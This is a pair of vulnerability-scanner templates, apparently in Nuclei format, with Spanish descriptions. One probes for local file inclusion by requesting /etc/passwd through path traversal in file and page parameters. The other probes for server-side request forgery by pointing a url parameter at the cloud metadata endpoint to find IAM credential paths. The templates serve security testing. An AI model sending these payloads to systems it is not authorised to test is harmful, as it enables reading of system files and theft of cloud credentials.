id: custom-lfi-pattern
info:
  name: Local File Inclusion (LFI) Probe
  author: scanops
  description: Comprueba inclusión de ficheros locales intentando leer /etc/passwd vía parámetro file.
  severity: high
  tags: [custom, lfi, file, inclusion]
http:
  - method: GET
    path:
      - "{{BaseURL}}/?file=../../../../../../etc/passwd"
      - "{{BaseURL}}/?page=../../../../../../etc/passwd"
    stop-at-first-match: true
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

---
id: custom-ssrf-probe
info:
  name: Server-Side Request Forgery (SSRF) Probe
  author: scanops
  description: Comprueba SSRF apuntando un parámetro url al endpoint de metadatos cloud.
  severity: high
  tags: [custom, ssrf, request, forgery]
http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
    matchers:
      - type: word
        part: body
        words:
          - "ami-id"
          - "instance-id"
          - "iam/security-credentials"
        condition: or
